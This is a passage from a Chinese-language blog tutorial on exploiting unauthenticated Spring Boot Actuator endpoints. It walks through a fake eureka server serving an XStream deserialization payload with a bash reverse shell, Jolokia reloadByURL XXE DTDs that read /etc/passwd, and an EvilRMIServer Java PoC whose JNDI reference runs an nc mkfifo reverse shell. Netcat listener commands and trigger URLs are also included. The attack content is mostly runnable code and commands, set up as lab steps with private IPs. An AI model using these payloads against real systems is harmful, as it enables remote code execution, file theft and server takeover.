<p><strong>步骤四：刷新配置</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用实例-2"><a href="#利用实例-2" class="headerlink" title="利用实例"></a>利用实例</h5><p>使用python 在服务器上搭建一个响应XStream payload的Web服务，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python# coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span>)@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span>(<span class="params">path</span>):</span>    </span><br><span class="line">xml = <span class="string">&quot;&quot;&quot;&lt;linked-hash-set&gt;  &lt;jdk.nashorn.internal.objects.NativeString&gt;    </span></span><br><span class="line"><span class="string">&lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;      &lt;dataHandler&gt;        </span></span><br><span class="line"><span class="string">&lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;          </span></span><br><span class="line"><span class="string">&lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;            </span></span><br><span class="line"><span class="string">&lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;                    </span></span><br><span class="line"><span class="string">&lt;command&gt;                       </span></span><br><span class="line"><span class="string">&lt;string&gt;/bin/bash&lt;/string&gt;                       </span></span><br><span class="line"><span class="string">&lt;string&gt;-c&lt;/string&gt;                      </span></span><br><span class="line"><span class="string">&lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/192.168.233.247/1234 0&gt;&amp;amp;1&lt;/string&gt;                    </span></span><br><span class="line"><span class="string">&lt;/command&gt;                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;                  &lt;/next&gt;                </span></span><br><span class="line"><span class="string">&lt;/iter&gt;                </span></span><br><span class="line"><span class="string">&lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;                  &lt;method&gt;                    </span></span><br><span class="line"><span class="string">&lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;                    &lt;name&gt;start&lt;/name&gt;                    </span></span><br><span class="line"><span class="string">&lt;parameter-types/&gt;                 </span></span><br><span class="line"><span class="string"> &lt;/method&gt;                  </span></span><br><span class="line"><span class="string">&lt;name&gt;foo&lt;/name&gt;                </span></span><br><span class="line"><span class="string">&lt;/filter&gt;                </span></span><br><span class="line"><span class="string">&lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;             </span></span><br><span class="line"><span class="string"> &lt;/serviceIterator&gt;              </span></span><br><span class="line"><span class="string">&lt;lock/&gt;            </span></span><br><span class="line"><span class="string">&lt;/cipher&gt;            </span></span><br><span class="line"><span class="string">&lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;            &lt;ibuffer&gt;&lt;/ibuffer&gt;          </span></span><br><span class="line"><span class="string">&lt;/is&gt;        </span></span><br><span class="line"><span class="string">&lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">&lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">&lt;/value&gt;</span></span><br><span class="line"><span class="string">&lt;/jdk.nashorn.internal.objects.NativeString&gt;&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span>    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Python3启动web,如下:</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/7622e80d3286c478d7fdf42a216d67d4.png)</p>
<p>使用Burp构造请求报文发送POST请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eureka.client.serviceUrl.defaultZone=http://192.168.233.249/xstream</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用/85864c908118a436d542c5dfc3fedba5.png)</p>
<p>刷新配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用/e061acae7d5aaf5dd9e36a188a0c7375.png)</p>
<p>kali开启监听端口1234获取反弹shell</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/c2aacb012495255a8681c062a427bc34.png)</p>
<p>注：该漏洞的成功利用与jdk版本有关，此处用的是1.8.0_161</p>
<h5 id="利用原理-2"><a href="#利用原理-2" class="headerlink" title="利用原理"></a>利用原理</h5><ol>
<li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li>
<li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload</li>
<li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li>
</ol>
<p>详细分析参见下文</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/234719.html">Spring Boot Actuator从未授权访问到getshell</a></p>
<h4 id="2-4-Jolokia漏洞-XXE"><a href="#2-4-Jolokia漏洞-XXE" class="headerlink" title="2.4.Jolokia漏洞 XXE"></a><strong>2.4.Jolokia漏洞 XXE</strong></h4><h5 id="利用条件-6"><a href="#利用条件-6" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li><p>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</p>
</li>
<li><p>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</p>
</li>
<li><p>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p>
</li>
<li><p>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过</p>
</li>
</ul>
<h5 id="利用方法-5"><a href="#利用方法-5" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一:查看已存在的 MBeans</strong></p>
<p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。</p>
<p><strong>步骤二：托管 xml 文件</strong></p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"><span class="comment"># 也可以开启apache或者nginx的http服务将其放在根目录下</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code>  文件，内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;rmi://your-vps-ip:port/jndi&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>步骤三：准备要执行的 Java 代码</strong></p>
<p>编写优化过后的用来反弹 shell 的 <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code>JNDIObject.java</code>，</p>
<p>使用Maven对其进行编译打包：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean install</span><br></pre></td></tr></table></figure>

<p><strong>然后将生成的</strong> jar包拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
<p><strong>步骤四：架设恶意 RMI 服务</strong></p>
<p>设置RMI服务的ip地址和开启服务端口8090</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>



<p><strong>步骤五：监听反弹 shell 的端口</strong></p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure>



<p><strong>步骤六：从外部 URL 地址加载日志配置文件</strong></p>
<blockquote>
<p>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p>
</blockquote>
<p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml</span><br></pre></td></tr></table></figure>



<h5 id="利用实例-3"><a href="#利用实例-3" class="headerlink" title="利用实例"></a>利用实例</h5><p>判断是否存在jolokia插件访问<a href="http://ip:port/jolokia/list">http://ip:port/jolokia/list</a> 是否存在</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/4406018ebff3c7de7dd29c07d7e0ccc7.png)</p>
<p>在/jolokia/list 接口搜索关键字：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ch.qos.logback.classic.jmx.JMXConfigurator和reloadByURL</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用/9fc925bb48d7fbc26191d101b9a9adab.png)</p>
<p><strong>读取敏感文件</strong></p>
<p>创建xml文档logback.xml</p>
<p>请求访问fileread.dtd文件，192.168.233.1为服务器ip</p>
<blockquote>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?\&gt;</span><br><span class="line"></span><br><span class="line"> \&lt;!DOCTYPE a [ \&lt;!ENTITY % remote SYSTEM</span><br><span class="line"></span><br><span class="line">  &quot;http://192.168.233.1/filereaed.dtd&quot;\&gt;%remote;%int;]\&gt;</span><br><span class="line"></span><br><span class="line">\&lt;a\&gt;&amp;trick;\&lt;/a\&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>将该xml放到服务器上，用于访问获取</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/2c2311a2d34ee6ff782221a35d920431.png)</p>
<p>创建文件fileread.dtd，读取/etc/passwd文件</p>
<blockquote>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % d SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  </span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#x27;:%d;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>![](Spring Boot Actuator未授权访问利用实战利用/f2d4373437722b5f3d7ac97085b66953.png)</p>
<p>在外部构造url访问，Payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.233.247:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/192.168.233.1!/logback.xml</span><br></pre></td></tr></table></figure>

<p>可以看到返回的信息中存在etc/passwd的用户信息</p>
<p>如红框中所示</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/66e6d7ece8ce1dbfd308720f8cbbb751.png)</p>
<p><strong>远程代码执行</strong></p>
<p>可以在logback.xml中使用insertFromJNDI标签，这个标签允许我们从 JNDI<br>加载变量，导致了rce漏洞产生。<br>rce的流程主要分为4步。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.  构造 Get 请求访问目标，使其去外部服务器加载恶意 logback.xml 文件。</span><br><span class="line"></span><br><span class="line">2.  解析 logback.xml 时，最终会触发 InitialContext.lookup(URI) 操作，而URI</span><br><span class="line">    为恶意 RMI 服务地址。</span><br><span class="line"></span><br><span class="line">3.  恶意 RMI 服务器向目标返回一个 Reference 对象，Reference</span><br><span class="line">    对象中指定了目标本地存在的 BeanFactory 类，以及Bean Class</span><br><span class="line">    的类名、属性、属性值（这里为 ELProcessor 、x、eval(...))。</span><br><span class="line"></span><br><span class="line">4.  目标在进行 lookup() 操作时，会动态加载并实例化 BeanFactory 类，接着调用</span><br><span class="line">    factory.getObjectInstance() 方法，通过反射的方式实例化 Reference</span><br><span class="line">    所指向的任意 Bean Class，并且会调用 setter</span><br><span class="line">    方法为所有的属性赋值。对应我们的代码，最终调用 setter</span><br><span class="line">    方法的时候，就是执行如下代码：</span><br><span class="line"></span><br><span class="line">ELProcessor.eval(\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc evil-server-ip port &gt;/tmp/f&#x27;]).start()\&quot;</span><br></pre></td></tr></table></figure>



<p>而 ELProcessor.eval() 会对 EL 表达式（这里为反弹 shell）进行求值，最终达到 RCE<br>的效果。</p>
<p>下面为编写的java代码漏洞利用poc，指定了反弹shell的ip地址和端口及其开启rmi服务的端口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 8090&quot;</span>);<span class="comment">//RMI服务地址为8090</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.249 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">         <span class="comment">//反弹shell地址为192.168.233.249，端口为1234</span></span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;jndi&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>使用maven对java代码进行编译打包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令:mvn clean install</span><br></pre></td></tr></table></figure>

<p>打包成功</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/d4957a0c50e626f62d06f5fc2853ddbb.png)</p>
<p>将上面打包的jar放到kali上，开启8090端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如下命令:java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用/d1dffff25909ba0840e280f858d32e0d.png)</p>
<p>使用nc开启监听1234端口</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/b531b990d627d9069028dcea04343c27.png)</p>
<p>下面为在服务器上放置的logback.xml用来请求kaLi开启的8090端口建立连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line"></span><br><span class="line">&lt;insertFromJNDI env-entry-name=&quot;rmi://192.168.233.249:8090/jndi&quot; as=&quot;appName&quot;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>



<p>在浏览器中从外部构造url访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.233.247:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!192.168.233.1!/logback.xml</span><br></pre></td></tr></table></figure>



<p>浏览器返回结果如下:</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/1e7783f49e5d0511d34e21997052151e.png)</p>
<p>可以看到kali下获取反弹的shell</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/a288f1cbdbcfd6a43eb37a0aa8362ef4.png)</p>
<p><strong>注: 如果目标成功请求了example.xml并且 marshalsec 也接收到了目标请求，但是目标没有请求JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</strong></p>
<h5 id="利用原理-3"><a href="#利用原理-3" class="headerlink" title="利用原理"></a><strong>利用原理</strong></h5><ul>
<li><p>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用<br>ch.qos.logback.classic.jmx.JMXConfigurator 类的 reloadByURL 方法</p>
</li>
<li><p>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</p>
</li>
<li><p>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</p>
</li>
<li><p>xml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI 服务器地址</p>
</li>
<li><p>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</p>
</li>
</ul>
<p>详细分析参见下文:</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4258">spring boot actuator rce via jolokia</a></p>
<h4 id="2-5-createJNDIRealm-RCE"><a href="#2-5-createJNDIRealm-RCE" class="headerlink" title="2.5.createJNDIRealm RCE"></a>2.5.createJNDIRealm RCE</h4><h5 id="利用条件-7"><a href="#利用条件-7" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
<li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
<li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141/7u131/8u121(RMI)，但相关环境可绕过</li>
</ul>
<h5 id="利用方法-6"><a href="#利用方法-6" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：查看已存在的 MBeans</strong></p>
<p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>type=MBeanFactory</code> 和 <code>createJNDIRealm</code> 关键词。</p>
<p><strong>步骤二：准备要执行的 Java 代码</strong></p>
<p>编写优化过后的用来反弹 shell 的 Java代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port xxxxx&quot;);//RMI服务监听地址</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xxx.xxx.xxx.xxx xxxx &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         //反弹shell地址为xxx.xxx.xxx.xxx(ip地址)，端口为xxxx(端口地址)</span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三： 打包java代码文件</strong></p>
<p>将编辑好的java代码打包成jar包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mvn clean install</span><br><span class="line">或者</span><br><span class="line">javac xxxxxxx.java</span><br><span class="line">jar -cvf  xxxx.jar -C src/ .</span><br></pre></td></tr></table></figure>



<p><strong>步骤四：架设恶意 RMI服务</strong></p>
<p>下载 <a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 rmi 服务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>



<p><strong>步骤五：监听反弹 shell 的端口</strong></p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure>



<p><strong>步骤六：发送恶意 payload</strong></p>
<p>根据实际情况修改 <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">springboot-realm-jndi-rce.py</a> 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行</p>
<h5 id="利用实例-4"><a href="#利用实例-4" class="headerlink" title="利用实例"></a>利用实例</h5><p>查看/jolokia/list 中存在的是否存在org.apache.catalina.mbeans.MBeanFactory类提供的createJNDIRealm方法</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/4f19e2342528cdbb64de48d186e11598.png)</p>
<p>下面为编写的java代码漏洞利用poc，指定了反弹shell的ip地址和端口及其开启rmi服务的端口</p>
